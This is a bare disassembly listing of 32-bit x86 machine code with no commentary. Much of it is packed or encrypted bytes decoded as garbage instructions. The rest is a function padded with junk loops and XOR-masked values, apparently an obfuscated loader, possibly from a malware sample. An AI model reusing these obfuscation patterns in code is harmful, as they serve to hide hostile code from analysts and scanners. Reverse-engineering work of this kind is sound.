  407972:	pop    edi
  407973:	dec    esp
  407974:	lods   al,BYTE PTR ds:[esi]
  407975:	add    ebp,DWORD PTR [ebp+0x3b]
  407978:	jg     0x40794f
  40797a:	adc    al,0x2c
  40797c:	xchg   DWORD PTR [ecx],edx
  40797e:	fcomip st,st(7)
  407980:	clc    
  407981:	jg     0x4079db
  407983:	push   ss
  407984:	xchg   DWORD PTR ds:[edi-0x2f],ecx
  407988:	out    dx,al
  407989:	fidivr DWORD PTR [edi]
  40798b:	pop    ss
  40798c:	xabort 0x23
  40798f:	iret   
  407990:	cmp    al,0xe
  407992:	aam    0x4c
  407994:	in     al,dx
  407995:	dec    ecx
  407996:	jns    0x40792e
  407998:	and    BYTE PTR ds:[esi+0x0],ah
  40799c:	aas    
  40799d:	inc    edi
  40799e:	and    eax,0xfe11c5b1
  4079a3:	mov    eax,ds:0x81e3eaed
  4079a8:	popf   
  4079a9:	or     dl,BYTE PTR [eax-0x205dd904]
  4079af:	jne    0x4079ff
  4079b1:	aam    0x44
  4079b3:	pop    esp
  4079b4:	push   esi
  4079b5:	test   eax,0x9a24998
  4079ba:	not    BYTE PTR [ebx]
  4079bc:	dec    edx
  4079bd:	data16 or al,0x9a
  4079c0:	stc    
  4079c1:	or     al,0x8e
  4079c3:	test   eax,0x9b5fa445
  4079c8:	es jb  0x407a0b
  4079cb:	addr16 sbb dh,ah
  4079ce:	sahf   
  4079cf:	fwait
  4079d0:	lahf   
  4079d1:	inc    esi
  4079d2:	dec    ebp
  4079d3:	ret    
  4079d4:	mov    WORD PTR [edx+0xec19a5b],ds
  4079da:	xchg   esp,eax
  4079db:	inc    ecx
  4079dc:	jl     0x407995
  4079de:	sub    esp,DWORD PTR [esi+0x35]
  4079e1:	arpl   WORD PTR [edi-0x17],dx
  4079e4:	pop    edi
  4079e5:	jo     0x407977
  4079e7:	fldcw  WORD PTR [edi]
  4079e9:	popaw  
  4079eb:	pop    edi
  4079ec:	test   eax,0xae9c8122
  4079f1:	in     al,0x4c
  4079f3:	aaa    
  4079f4:	cld    
  4079f5:	or     ebx,esp
  4079f7:	mov    edi,0x44f39505
  4079fc:	and    al,0x7e
  4079fe:	addr16 das 
  407a00:	or     eax,0x6844b751
  407a05:	jo     0x407989
  407a07:	xchg   ebx,eax
  407a08:	scas   eax,DWORD PTR es:[edi]
  407a09:	js     0x407990
  407a0b:	test   BYTE PTR cs:[edi+ebp*8],ch
  407a0f:	lds    ebx,FWORD PTR [ebp+0x25720e37]
  407a15:	jne    0x407a91
  407a17:	(bad)  
  407a18:	faddp  st(3),st
  407a1a:	or     ebx,DWORD PTR [ebp+0x2bd4e1b4]
  407a20:	mov    dl,0xdc
  407a22:	dec    esi
  407a23:	cdq    
  407a24:	cld    
  407a25:	test   BYTE PTR [esi+0x6a052691],0xff
  407a2c:	xor    eax,0x43a38c
  407a31:	push   DWORD PTR ds:0x43a654
  407a37:	push   DWORD PTR [ebp-0x28]
  407a3a:	push   DWORD PTR [ebp-0x2c]
  407a3d:	mov    eax,DWORD PTR [ebp-0x14]
  407a40:	call   eax
  407a42:	mov    eax,DWORD PTR [ebp-0x30]
  407a45:	mov    ecx,DWORD PTR ds:0x43a350
  407a4b:	add    DWORD PTR [eax],ecx
  407a4d:	pop    edi
  407a4e:	pop    esi
  407a4f:	leave  
  407a50:	ret    
  407a51:	push   ebp
  407a52:	mov    ebp,esp
  407a54:	sub    esp,0x18
  407a57:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  407a5e:	lea    eax,[ebp+0x14]
  407a61:	adc    DWORD PTR ds:0x43501c,ecx
  407a67:	mov    DWORD PTR [ebp-0x4],eax
  407a6a:	adc    ecx,edx
  407a6c:	push   esi
  407a6d:	xor    ecx,0x4b84
  407a73:	mov    esi,0xf89c8585
  407a78:	xor    DWORD PTR ds:0x438014,edx
  407a7e:	mov    DWORD PTR [ebp-0xc],esi
  407a81:	lea    eax,[ebp-0xc]
  407a84:	adc    edx,ecx
  407a86:	mov    DWORD PTR [ebp-0x14],eax
  407a89:	mov    DWORD PTR ds:0x436014,0x1f
  407a93:	cmp    DWORD PTR ds:0x436014,0x0
  407a9a:	je     0x407ae5
  407aa0:	cmp    DWORD PTR ds:0x436014,0x6
  407aa7:	jg     0x407ae5
  407aad:	jmp    0x407abd
  407ab2:	push   0x43a097
  407ab7:	call   DWORD PTR ds:0x43a8d0
  407abd:	cmp    DWORD PTR ds:0x436014,0x7
  407ac4:	jne    0x407ad5
  407aca:	mov    eax,ds:0x436014
  407acf:	dec    eax
  407ad0:	mov    ds:0x436014,eax
  407ad5:	mov    eax,ds:0x436014
  407ada:	dec    eax
  407adb:	mov    ds:0x436014,eax
  407ae0:	jmp    0x407a93
  407ae5:	mov    eax,DWORD PTR [ebp-0xc]
  407ae8:	mov    edx,DWORD PTR [ebp-0x14]
  407aeb:	mov    ecx,0x751089b
  407af0:	xor    eax,ecx
  407af2:	add    eax,0x3272e2
  407af7:	adc    DWORD PTR ds:0x435010,0x438000
  407b01:	mov    DWORD PTR [edx],eax
  407b03:	sub    DWORD PTR ds:0x437008,0x436000
  407b0d:	mov    eax,ds:0x43a14c
  407b12:	sbb    DWORD PTR ds:0x43500c,ebx
  407b18:	mov    edx,DWORD PTR [ebp-0x4]
  407b1b:	or     DWORD PTR ds:0x435010,0x2376
  407b25:	mov    eax,DWORD PTR [eax]
  407b27:	add    DWORD PTR ds:0x434010,0x435010
  407b31:	add    eax,DWORD PTR [edx]
  407b33:	push   edi
  407b34:	mov    DWORD PTR [ebp-0x8],eax
  407b37:	mov    edi,DWORD PTR [ebp+0x8]
  407b3a:	and    DWORD PTR ds:0x438004,0x0
  407b44:	xor    edx,edx
  407b46:	xor    edx,DWORD PTR ds:0x438004
  407b4c:	inc    edx
  407b4d:	mov    DWORD PTR ds:0x438004,edx
  407b53:	cmp    DWORD PTR ds:0x438004,0x20
  407b5a:	jle    0x407b7d
  407b60:	jmp    0x407b70
  407b65:	push   0x43a111
  407b6a:	call   DWORD PTR ds:0x43a8d4
  407b70:	cmp    DWORD PTR ds:0x438004,0x11
  407b77:	jb     0x407b44
  407b7d:	mov    eax,ds:0x43a2d4
  407b82:	mov    eax,DWORD PTR [eax+0x198]
  407b88:	adc    DWORD PTR ds:0x43501c,0x6968
  407b92:	xor    edi,ecx
  407b94:	mov    edx,0x3272e2
  407b99:	add    edi,edx
  407b9b:	mov    DWORD PTR ds:0x434028,0x7d8d
  407ba5:	cmp    DWORD PTR [eax],edi
  407ba7:	mov    DWORD PTR ds:0x43500c,0x2ed0
  407bb1:	je     0x407bd2
  407bb7:	mov    DWORD PTR ds:0x43401c,0x771b
  407bc1:	mov    eax,DWORD PTR [eax]
  407bc3:	mov    DWORD PTR ds:0x434028,0x1ca1
  407bcd:	jmp    0x40a3ac
  407bd2:	mov    eax,DWORD PTR [ebp+0x18]
  407bd5:	cmp    eax,esi
  407bd7:	jne    0x407bf1
  407bdd:	mov    DWORD PTR ds:0x437010,0x6440
  407be7:	push   0xf89c8584
  407bec:	jmp    0x40a39b
  407bf1:	mov    esi,DWORD PTR [ebp+0x18]
  407bf4:	mov    eax,0xf89c85bb
  407bf9:	cmp    esi,eax
  407bfb:	jne    0x40a38b
  407c01:	sub    eax,esi
  407c03:	mov    eax,DWORD PTR [ebp+0x10]
  407c06:	xor    eax,ecx
  407c08:	mov    DWORD PTR ds:0x437008,0x10
  407c12:	cmp    DWORD PTR ds:0x437008,0x0
  407c19:	je     0x407c4c
  407c1f:	cmp    DWORD PTR ds:0x437008,0x12
  407c26:	jl     0x407c4c
  407c2c:	jmp    0x407c3a
  407c31:	push   DWORD PTR [ebp-0x18]
  407c34:	call   DWORD PTR ds:0x43a8dc
  407c3a:	mov    esi,DWORD PTR ds:0x437008
  407c40:	dec    esi
  407c41:	mov    DWORD PTR ds:0x437008,esi
  407c47:	jmp    0x407c12
  407c4c:	add    eax,edx
  407c4e:	and    DWORD PTR ds:0x43501c,0x0
  407c58:	jmp    0x407c6c
  407c5d:	xor    esi,esi
  407c5f:	or     esi,DWORD PTR ds:0x43501c
  407c65:	inc    esi
  407c66:	mov    DWORD PTR ds:0x43501c,esi
  407c6c:	cmp    DWORD PTR ds:0x43501c,0x1f
  407c73:	jae    0x407cc0
  407c79:	cmp    DWORD PTR ds:0x43501c,0x12
  407c80:	jg     0x407cc0
  407c86:	jmp    0x407ca1
  407c8b:	push   0x43a0c9
  407c90:	push   0x779d
  407c95:	push   DWORD PTR [ebp-0x18]
  407c98:	push   DWORD PTR [ebp-0x18]
  407c9b:	call   DWORD PTR ds:0x43a8e0
  407ca1:	cmp    DWORD PTR ds:0x43501c,0x11
  407ca8:	jne    0x407cbb
  407cae:	mov    esi,DWORD PTR ds:0x43501c
  407cb4:	inc    esi
  407cb5:	mov    DWORD PTR ds:0x43501c,esi
  407cbb:	jmp    0x407c5d
  407cc0:	mov    DWORD PTR [ebp-0x18],eax
  407cc3:	and    esi,esi
  407cc5:	mov    eax,DWORD PTR [ebp+0xc]
  407cc8:	mov    esi,DWORD PTR ds:0x437010
  407cce:	or     DWORD PTR ds:0x43600c,esi
  407cd4:	mov    esi,DWORD PTR [ebp-0x8]
  407cd7:	adc    DWORD PTR ds:0x43401c,0x438010
  407ce1:	xor    eax,ecx
  407ce3:	adc    DWORD PTR ds:0x435004,0x436008
  407ced:	add    eax,edx
  407cef:	xor    DWORD PTR ds:0x43501c,0x437018
  407cf9:	imul   eax,DWORD PTR [esi]
  407cfc:	mov    esi,DWORD PTR [ebp+0x8]
  407cff:	and    DWORD PTR ds:0x43700c,0x3cde
  407d09:	xor    esi,ecx
  407d0b:	sbb    DWORD PTR ds:0x437000,0x2ed1
  407d15:	add    esi,edx
  407d17:	mov    DWORD PTR ds:0x436004,0x2911
  407d21:	cmp    esi,eax
  407d23:	mov    eax,DWORD PTR [ebp-0x4]
  407d26:	mov    DWORD PTR ds:0x43501c,0x4044
  407d30:	push   ebx
  407d31:	mov    DWORD PTR ds:0x43600c,0x6dfa
  407d3b:	je     0x407e07
  407d41:	mov    DWORD PTR ds:0x435018,0x18
  407d4b:	cmp    DWORD PTR ds:0x435018,0x0
  407d52:	je     0x407db4
  407d58:	cmp    DWORD PTR ds:0x435018,0x8
  407d5f:	jb     0x407db4
  407d65:	jmp    0x407d88
  407d6a:	push   0x2a76
  407d6f:	push   0x436018
  407d74:	push   DWORD PTR [ebp-0xc]
  407d77:	push   0x43a01f
  407d7c:	push   DWORD PTR [ebp-0x24]
  407d7f:	push   DWORD PTR [ebp-0x24]
  407d82:	call   DWORD PTR ds:0x43a8e4
  407d88:	cmp    DWORD PTR ds:0x435018,0x9
  407d8f:	jne    0x407da2
  407d95:	mov    esi,DWORD PTR ds:0x435018
  407d9b:	dec    esi
  407d9c:	mov    DWORD PTR ds:0x435018,esi
  407da2:	mov    esi,DWORD PTR ds:0x435018
  407da8:	dec    esi
  407da9:	mov    DWORD PTR ds:0x435018,esi
  407daf:	jmp    0x407d4b
  407db4:	mov    esi,DWORD PTR [ebp-0x18]
  407db7:	add    DWORD PTR [eax],esi
  407db9:	mov    eax,DWORD PTR [ebp-0x4]
  407dbc:	mov    esi,DWORD PTR ds:0x43700c
  407dc2:	xor    esi,DWORD PTR ds:0x434008
  407dc8:	mov    DWORD PTR ds:0x43700c,esi
  407dce:	mov    esi,DWORD PTR [ebp+0xc]
  407dd1:	and    DWORD PTR ds:0x436010,0x434018
  407ddb:	xor    esi,ecx
  407ddd:	add    DWORD PTR ds:0x435018,0x43600c
  407de7:	add    esi,edx
  407de9:	xor    DWORD PTR ds:0x437014,0x43801c
  407df3:	imul   esi,DWORD PTR [eax]
  407df6:	mov    DWORD PTR ds:0x436018,0x6d68
  407e00:	mov    DWORD PTR [eax],esi
  407e02:	jmp    0x407e77
  407e07:	mov    DWORD PTR ds:0x435014,0x11
  407e11:	cmp    DWORD PTR ds:0x435014,0x0
  407e18:	je     0x407e72
  407e1e:	cmp    DWORD PTR ds:0x435014,0x6
  407e25:	ja     0x407e72
  407e2b:	jmp    0x407e46
  407e30:	push   DWORD PTR [ebp-0xc]
  407e33:	push   0x2134
  407e38:	push   DWORD PTR [ebp-0x24]
  407e3b:	push   0x8f99
  407e40:	call   DWORD PTR ds:0x43a8e8
  407e46:	cmp    DWORD PTR ds:0x435014,0x7
  407e4d:	jne    0x407e60
  407e53:	mov    ebx,DWORD PTR ds:0x435014
  407e59:	dec    ebx
  407e5a:	mov    DWORD PTR ds:0x435014,ebx
  407e60:	mov    ebx,DWORD PTR ds:0x435014
  407e66:	dec    ebx
  407e67:	mov    DWORD PTR ds:0x435014,ebx
  407e6d:	jmp    0x407e11
  407e72:	mov    esi,DWORD PTR [ebp+0x14]
  407e75:	xor    DWORD PTR [eax],esi
  407e77:	mov    eax,DWORD PTR [ebp-0x4]
  407e7a:	mov    edi,DWORD PTR [ebp+0x10]
  407e7d:	xor    edi,ecx
  407e7f:	mov    esi,0xffcd8d1e
  407e84:	mov    ebx,esi
  407e86:	sub    ebx,edi
  407e88:	add    DWORD PTR [eax],ebx
  407e8a:	mov    eax,DWORD PTR [ebp-0x4]
  407e8d:	mov    edi,DWORD PTR [ebp-0x8]
  407e90:	add    edi,DWORD PTR [eax]
  407e92:	mov    DWORD PTR [ebp-0x8],edi
  407e95:	mov    eax,DWORD PTR [ebp+0xc]
  407e98:	mov    edi,DWORD PTR [ebp+0xc]
  407e9b:	xor    edi,ecx
  407e9d:	xor    eax,ecx
  407e9f:	jmp    0x40a259
  407ea4:	lahf   
  407ea5:	(bad)  
  407ea6:	xchg   esp,eax
  407ea7:	jle    0x407e3d
  407ea9:	emms   
  407eab:	xchg   DWORD PTR [edi],ebp
  407ead:	jmp    0xe2f2:0xfe86c670
  407eb4:	test   eax,0xd17c7c3a
  407eb9:	pop    edi
  407eba:	jl     0x407f38
  407ebc:	pop    esi
  407ebd:	sahf   
  407ebe:	jmp    0xad81:0x7fb361dc
  407ec5:	pop    edi
  407ec6:	ins    DWORD PTR es:[edi],dx
  407ec7:	add    ecx,DWORD PTR ds:0xc1035445
  407ecd:	inc    ecx
  407ece:	xchg   DWORD PTR [eax-0x6e2c3178],edx
  407ed4:	ins    DWORD PTR es:[edi],dx
  407ed5:	ins    BYTE PTR es:[edi],dx
  407ed6:	ss std 
  407ed8:	js     0x407ef2
  407eda:	or     DWORD PTR [edx+0x1f],0x76
  407ede:	jge    0x407eaa
  407ee0:	and    al,0x5d
  407ee2:	jno    0x407f43
  407ee4:	data16 (bad) [esp+esi*8-0xbce71a8]
  407eec:	push   ecx
  407eed:	dec    ebp
  407eee:	or     al,0xbe
  407ef0:	popf   
  407ef1:	jbe    0x407e79
  407ef3:	mov    esi,0x177f0716
  407ef8:	jmp    0x5382ede9
  407efd:	jle    0x407f7e
  407eff:	js     0x407f38
  407f01:	es pusha 
  407f03:	fisttp WORD PTR [edx]
  407f05:	fwait
  407f06:	outs   dx,BYTE PTR ds:[esi]
  407f07:	jge    0x407ed2
  407f09:	adc    eax,0xffffff98
  407f0c:	test   DWORD PTR [edx+0x7745d9d5],edx
  407f12:	ds jmp 0xe68:0x23cecad6
  407f1a:	jmp    0xe1299fd0
  407f1f:	outs   dx,DWORD PTR ds:[esi]
  407f20:	xchg   ebx,eax
  407f21:	fwait
  407f22:	call   0x2ea3:0x2a607aca
  407f29:	xor    ebp,DWORD PTR [edi-0x38a13e44]
  407f2f:	jb     0x407f83
  407f31:	lea    edi,[edx-0x66]
  407f34:	inc    edi
  407f35:	popa   
  407f36:	adc    DWORD PTR [edx],0x56
  407f39:	in     al,dx
  407f3a:	test   DWORD PTR [ebp-0x14],edx
  407f3d:	in     al,0xde
  407f3f:	pop    edi
  407f40:	ds push es
  407f42:	fisubr DWORD PTR [ebx+0x67]
  407f45:	stc    
  407f46:	inc    eax
  407f47:	rcl    BYTE PTR [ebp+0x3abb205c],0x23
  407f4e:	adc    DWORD PTR fs:[esi],0x5c
  407f52:	jge    0x407fa4
  407f54:	mov    al,0x3f
  407f56:	push   0xa0cc8d04
  407f5b:	or     DWORD PTR [edi-0x2fbb9409],edi
  407f61:	bound  esi,QWORD PTR [ecx+0x2821305d]
  407f67:	in     eax,dx
  407f68:	jecxz  0x407fb4
  407f6a:	ficomp DWORD PTR [ecx]
  407f6c:	aas    
  407f6d:	std    
  407f6e:	out    0xb3,al
  407f70:	sub    ebx,DWORD PTR [ecx+0x77]
  407f73:	xor    eax,0xb656b94b
  407f78:	inc    ebp
  407f79:	mov    bh,0xa2
  407f7b:	jo     0x407f0a
  407f7d:	(bad)  
  407f7e:	jecxz  0x407f30
  407f80:	mov    esp,0x45ffa055
  407f85:	jecxz  0x407f73
  407f87:	and    ebp,DWORD PTR [eax-0x6f]
  407f8a:	push   cs
  407f8b:	adc    edi,ecx
  407f8d:	sbb    esi,DWORD PTR [ebp-0x24]
  407f90:	mov    ?,WORD PTR [esp+ecx*1-0x13b31a33]
  407f97:	mov    edx,es
  407f99:	push   eax
  407f9a:	xchg   ebp,eax
  407f9b:	frstor [edi]
  407f9d:	cmc    
  407f9e:	int    0xc9
  407fa0:	outs   dx,DWORD PTR ds:[esi]
  407fa1:	das    
  407fa2:	ret    0x7088
  407fa5:	in     al,dx
  407fa6:	pop    ecx
  407fa7:	push   eax
  407fa8:	stos   DWORD PTR es:[edi],eax
  407fa9:	mov    dh,0xee
  407fab:	mov    ds:0x53e14782,al
  407fb0:	loop   0x407fba
  407fb2:	jmp    0x606b:0x2408f459
  407fb9:	ret    0xa3a8
  407fbc:	sub    eax,0xe0035f6a
  407fc1:	pop    ebp
  407fc2:	xchg   edi,eax
  407fc3:	inc    edi
  407fc4:	and    esi,DWORD PTR [esi+0x5f]
  407fc7:	mov    ecx,0xfb7e7be2
  407fcc:	daa    
  407fcd:	push   cs
  407fce:	xor    DWORD PTR [esi-0x1],0xffffffa8
  407fd2:	jmp    0x408037
  407fd4:	push   ebp
  407fd5:	pop    ebp
  407fd6:	outs   dx,DWORD PTR ds:[esi]
  407fd7:	arpl   WORD PTR [ecx-0x3f],dx
  407fda:	arpl   bp,sp
  407fdc:	xlat   BYTE PTR ds:[ebx]
  407fdd:	(bad)  
  407fde:	(bad)  
  407fdf:	add    DWORD PTR [ebx+0x2d],edi
  407fe2:	dec    ebp
  407fe3:	out    dx,al
  407fe4:	out    dx,al
  407fe5:	jns    0x407f78
  407fe7:	in     al,dx
  407fe8:	mov    ecx,0x7efc7bdf
  407fed:	xor    cl,BYTE PTR [ebp+eax*1-0x73]
  407ff1:	data16 and al,0xca
  407ff4:	clc    
  407ff5:	push   ecx
  407ff6:	inc    ebp
  407ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ff8:	lods   eax,DWORD PTR ds:[esi]
  407ff9:	sbb    ch,BYTE PTR ds:0xb8b6d7f5
  407fff:	(bad)  
  408000:	dec    esp
  408001:	outs   dx,DWORD PTR ds:[esi]
  408002:	inc    ecx
  408003:	and    eax,0x40994aa2
  408008:	mov    ds:0xada1759e,al
  40800d:	in     al,dx
  40800e:	lahf   
  40800f:	add    ecx,DWORD PTR [edx-0x3ff76905]
  408015:	nop
  408016:	mov    eax,ds:0xb2826eaa
  40801b:	push   0xffffff94
  40801d:	jnp    0x40806a
  40801f:	xor    al,0x20
  408021:	ficomp WORD PTR [esi]
  408023:	mov    ds:0xeaa6bcb3,eax
  408028:	mov    eax,ds:0x1c1507ac
  40802d:	push   0x6b
  40802f:	in     al,0x82
  408031:	sub    edi,edi
  408033:	(bad)  
  408034:	mov    eax,0x2d4b6f34
  408039:	xor    DWORD PTR [ecx+edi*4+0x21],0x8302d38a
  408041:	jl     0x4080a9
  408043:	cmp    al,al
  408045:	iret   
  408046:	dec    ecx
  408047:	cmp    esi,0xe3bdd456
  40804d:	(bad)  
  40804f:	xor    ebx,DWORD PTR [edx]
  408051:	and    DWORD PTR [edx+eiz*8+0x51e20f91],ecx
  408058:	dec    edi
  408059:	jno    0x40800f
  40805b:	inc    eax
  40805c:	in     eax,0xf2
  40805e:	inc    eax
  40805f:	or     al,0x87
  408061:	push   0x79113fc9
  408066:	cld    
  408067:	and    DWORD PTR [ebx+0x1083d98],eax
  40806d:	jne    0x4080cb
  40806f:	icebp  
  408070:	int    0x37
  408072:	jmp    0x44da:0x63840930
  408079:	lea    ebp,[eax-0x4782292]
  40807f:	sbb    bl,BYTE PTR [ebx-0x51a1277e]
  408085:	in     eax,dx
  408086:	int3   
  408087:	fisubr DWORD PTR [eax+0x2f791f11]
  40808d:	jg     0x408015
  40808f:	in     al,0xe9
  408091:	aas    
  408092:	in     eax,dx
  408093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408094:	in     eax,0x4b
  408096:	popf   
  408097:	dec    ecx
  408098:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408099:	xor    dh,bh
  40809b:	mov    edi,0x16b90413
  4080a0:	js     0x40810e
  4080a2:	pop    es
  4080a3:	out    0xb8,al
  4080a5:	sub    eax,0x9c8d64f0
  4080aa:	jecxz  0x408031
  4080ac:	popf   
  4080ad:	mov    bh,0xa1
  4080af:	int3   
  4080b0:	jne    0x408032
  4080b2:	xchg   DWORD PTR [ecx+ebp*1+0x41],edi
  4080b6:	mov    DWORD PTR [edx+0x5c],edx
  4080b9:	push   cs
  4080ba:	pop    ebx
  4080bb:	or     eax,0x32ad8356
  4080c0:	cdq    
  4080c1:	pop    ebp
  4080c2:	dec    ebx
  4080c3:	fs test ecx,0x116ea542
  4080ca:	add    eax,0xcaa5c3b9
  4080cf:	mov    DWORD PTR ds:0xe673d912,esi
  4080d5:	ja     0x408072
  4080d7:	xchg   bl,ah
  4080d9:	and    esi,edx
  4080db:	pop    ecx
  4080dc:	pop    ecx
  4080dd:	(bad)  
  4080de:	adc    ecx,ebp
  4080e0:	test   eax,0x53286f48
  4080e5:	das    
  4080e6:	in     eax,0xfc
  4080e8:	inc    ebp
  4080e9:	push   eax
  4080ea:	mov    bl,0x63
  4080ec:	loop   0x4080f6
  4080ee:	push   cs
  4080ef:	mov    dh,BYTE PTR [eax-0x489d2db6]
  4080f5:	add    DWORD PTR ds:0x7e34bf5e,0xffffffb5
  4080fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080fd:	(bad)  
  4080fe:	shr    BYTE PTR [ebp+0x32],0x3f
  408102:	cli    
  408103:	not    dl
  408105:	stc    
  408106:	sar    DWORD PTR [edi],0x1f
  408109:	dec    esi
  40810a:	mov    BYTE PTR [ebx],cl
  40810c:	xchg   edx,eax
  40810d:	xchg   edi,eax
  40810e:	(bad)  
  40810f:	in     eax,0x8d
  408111:	addr16 or al,dl
  408114:	inc    ebp
  408115:	push   0x30
  408117:	add    ebp,esi
  408119:	stc    
  40811a:	or     esi,ebp
  40811c:	test   al,0x7d
  40811e:	jb     0x4080fb
  408120:	fadd   QWORD PTR ds:0x6f832536
  408126:	mov    dh,dh
  408128:	shl    BYTE PTR [ecx],1
  40812a:	loop   0x408173
  40812c:	adc    eax,0x4a3ff372
  408131:	lfs    ebp,FWORD PTR [eax-0x6f0f5af0]
  408138:	sub    al,0x24
  40813a:	ds xor al,0x60
  40813d:	enter  0x5c2a,0xad
  408141:	push   0xa441beb3
  408146:	pop    es
  408147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408148:	sahf   
  408149:	mov    gs,WORD PTR [ebx]
  40814b:	dec    ebp
  40814c:	jmp    0x75e2732b
  408151:	out    0x12,al
  408153:	shr    BYTE PTR [eax-0x43],0xe8
  408157:	enter  0x2151,0x4a
  40815b:	ja     0x4081b9
  40815d:	dec    ebx
  40815e:	ficom  WORD PTR [eax-0x210b6beb]
  408164:	jge    0x40816b
  408166:	adc    al,0x5f
  408168:	cmp    esi,ecx
  40816a:	mov    BYTE PTR [ebp+0x2a],al
  40816d:	push   0xffffffa0
  40816f:	jp     0x4081f0
  408171:	mov    dh,0xd6
  408173:	xor    BYTE PTR fs:[esi],bl
  408176:	or     ebp,DWORD PTR [ebx]
  408178:	mov    cl,0xa5
  40817a:	aas    
  40817b:	or     dh,BYTE PTR [edi]
  40817d:	dec    edi
  40817e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40817f:	cdq    
  408180:	mov    esi,DWORD PTR [esi+edi*8]
  408183:	xor    al,0x16
  408185:	rol    ebx,1
  408187:	outs   dx,DWORD PTR ds:[esi]
  408188:	lods   eax,DWORD PTR ds:[esi]
  408189:	fdivp  st(2),st
  40818b:	jl     0x408180
  40818d:	inc    edx
  40818e:	or     dl,0xb7
  408191:	sbb    al,BYTE PTR [eax+0x333cce89]
  408197:	cmp    cl,al
  408199:	adc    eax,0x21b99b34
  40819e:	mov    esp,0xe938a6a8
  4081a3:	push   edx
  4081a4:	in     al,0xe7
  4081a6:	inc    esp
  4081a7:	sbb    eax,0x245587e0
  4081ac:	aad    0xf
  4081ae:	(bad)  
  4081b0:	(bad)  
  4081b1:	jns    0x4081ec
  4081b3:	rol    DWORD PTR [esi-0x44ae5a1d],cl
  4081b9:	dec    ebx
  4081ba:	data16 cli 
  4081bc:	xchg   esp,eax
  4081bd:	dec    esi
  4081be:	sub    esp,DWORD PTR ds:0xfc5a2c1c
  4081c4:	add    ebp,DWORD PTR [edx+ecx*2-0x3f3b5c8e]
  4081cb:	in     eax,dx
  4081cc:	cmc    
  4081cd:	std    
  4081ce:	into   
  4081cf:	jecxz  0x40818f
  4081d1:	in     eax,0x7a
  4081d3:	push   ss
  4081d4:	repnz cmc 
  4081d6:	add    eax,edi
  4081d8:	or     DWORD PTR [ebp+0x3117d96b],ebp
  4081de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081df:	test   DWORD PTR gs:[eax],edx
  4081e2:	fisttp WORD PTR [eax-0x80f1a3d]
  4081e8:	sub    cl,BYTE PTR [esi+0x13]
  4081eb:	cs daa 
  4081ed:	rol    DWORD PTR [edx-0x80ea67f],cl
  4081f3:	or     eax,0xe689cb7f
  4081f8:	and    eax,0xe3f52d1d
  4081fd:	leave  
  4081fe:	jle    0x408227
  408200:	mov    dh,0xbe
  408202:	dec    edi
  408203:	scas   al,BYTE PTR es:[edi]
  408204:	iret   
  408205:	call   0xb029d7dc
  40820a:	arpl   dx,si
  40820c:	lds    esi,FWORD PTR [esi]
  40820e:	pop    ecx
  40820f:	mov    dl,0xa8
  408211:	jecxz  0x4081a2
  408213:	and    ebp,DWORD PTR [edi+ebp*2]
  408216:	fs sbb al,0xb2
  408219:	add    DWORD PTR [edx],esi
  40821b:	fidivr DWORD PTR [edx]
  40821d:	mov    bl,BYTE PTR [edi]
  40821f:	inc    eax
  408220:	mov    dh,0xf4
  408222:	push   ebx
  408223:	sti    
  408224:	sbb    edx,esp
  408226:	in     al,dx
  408227:	dec    edx
  408228:	in     eax,dx
  408229:	jle    0x4081da
  40822b:	aas    
  40822c:	ds pop edx
  40822e:	xchg   DWORD PTR [edx-0x9],ebp
  408231:	sbb    DWORD PTR [edx-0x67],esi
  408234:	int    0xf4
  408236:	ins    BYTE PTR es:[edi],dx
  408237:	push   esp
  408238:	stos   BYTE PTR es:[edi],al
  408239:	js     0x4081bf
  40823b:	jmpw   0x36be
  40823f:	push   ecx
  408240:	pop    edx
  408241:	out    0xc6,al
  408243:	ins    DWORD PTR es:[edi],dx
  408244:	and    eax,0x5581d961
  408249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40824a:	scas   al,BYTE PTR es:[edi]
  40824b:	(bad)  
  40824c:	rcl    DWORD PTR [ebx-0x74152644],1
  408252:	imul   edi,esi,0xffffffa8
  408255:	push   ecx
  408256:	cmp    ch,BYTE PTR [edi-0xd46a555]
  40825c:	dec    ebp
  40825d:	sub    al,0xd5
  40825f:	leave  
  408260:	bnd jge 0x4082b7
  408263:	js     0x40828a
  408265:	aas    
  408266:	sbb    DWORD PTR [ecx+edx*8-0x244111e4],ecx
  40826d:	hlt    
  40826e:	retf   
  40826f:	sbb    BYTE PTR [esi+ebx*2],bh
  408272:	lock mov WORD PTR [edx],cs
  408275:	push   es
  408276:	fwait
  408277:	mov    ah,0x6a
  408279:	in     eax,dx
  40827a:	rcr    BYTE PTR [ecx+eiz*1+0x52059d76],0xf
  408282:	cmp    BYTE PTR [ebx-0x44],0x83
  408286:	pusha  
  408287:	add    eax,0x29309c26
  40828c:	cmp    dl,BYTE PTR [ebx+0x46]
  40828f:	pop    eax
  408290:	cdq    
  408291:	imul   edx,DWORD PTR [edi],0x91ef1124
  408297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408298:	inc    eax
  408299:	mov    edx,0xd4d8234f
  40829e:	repnz mov ecx,ss
  4082a1:	popa   
  4082a2:	imul   edx,DWORD PTR [edx+0x16ca570c],0xffffffec
  4082a9:	adc    cl,BYTE PTR [ecx+ecx*8-0x7e41c8e4]
  4082b0:	add    DWORD PTR [esi],ebx
  4082b2:	retf   0xcb4a
  4082b5:	pop    edi
  4082b6:	fcomp  QWORD PTR [edx]
  4082b8:	xor    ecx,eax
  4082ba:	test   eax,0xf65135b7
  4082bf:	ins    DWORD PTR es:[edi],dx
  4082c0:	mov    edx,0xf7b1362f
  4082c5:	(bad)  
  4082c6:	out    0x63,eax
  4082c8:	sbb    ah,BYTE PTR [ecx-0x44]
  4082cb:	shl    DWORD PTR [edx-0x6775a2d4],0xf8
  4082d2:	lds    esp,FWORD PTR [edx]
  4082d4:	xor    eax,0x3970f082
  4082d9:	bound  eax,QWORD PTR [ecx-0x5c]
  4082dc:	jmp    0x408271
  4082de:	jae    0x408286
  4082e0:	repz push 0xffffffe1
  4082e3:	shl    DWORD PTR [eax],1
  4082e5:	cdq    
